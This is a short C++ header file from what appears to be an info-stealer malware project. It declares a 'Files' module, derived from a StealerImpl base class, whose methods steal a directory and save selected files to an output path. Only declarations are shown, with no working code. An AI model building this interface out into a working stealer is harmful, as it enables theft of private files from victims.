//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_FILES_H
#define STEALER_FILES_H


#include "../../StealerImpl.h"

class Files : public StealerImpl {
public:
    void execute(fs::path& root) override;
private:
    static void steal_directory(const fs::path &path, const fs::path &out);
    static void check_and_save_file(const fs::path &path, const fs::path &rel_path, const fs::path &out);
};


#endif //STEALER_FILES_H
